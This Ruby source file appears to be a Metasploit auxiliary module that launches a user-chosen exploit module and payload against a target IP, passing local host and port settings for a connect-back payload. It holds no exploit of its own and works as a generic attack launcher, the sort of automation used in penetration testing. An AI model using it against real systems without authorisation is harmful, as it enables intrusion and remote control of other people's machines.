class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info, {}))

    register_options([
      OptString.new('RHOST', [true, 'Target IP']),
      OptString.new('EXPLOIT', [true, 'Exploit module path']),
      OptString.new('PAYLOAD', [true, 'Payload module']),
      OptString.new('LHOST', [true, 'Local host for payload']),
      OptInt.new('LPORT', [true, 'Local port for payload']),
    ])
  end

  def run
    rhost = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    exploit = framework.exploits.create(exploit_name)
    if exploit.nil?
      print_error("Exploit module not found: #{exploit_name}")
      return
    end

    payload = framework.payloads.create(payload_name)
    if payload.nil?
      print_error("Payload module not found: #{payload_name}")
      return
    end

    exploit.datastore['RHOST'] = rhost
    exploit.datastore['LHOST'] = lhost if exploit.datastore.include?('LHOST')
    exploit.datastore['LPORT'] = lport if exploit.datastore.include?('LPORT')
    exploit.datastore['PAYLOAD'] = payload_name

    payload.datastore['LHOST'] = lhost if payload.datastore.include?('LHOST')
    payload.datastore['LPORT'] = lport if payload.datastore.include?('LPORT')

    exploit.exploit_simple('Payload' => payload)
  end
end

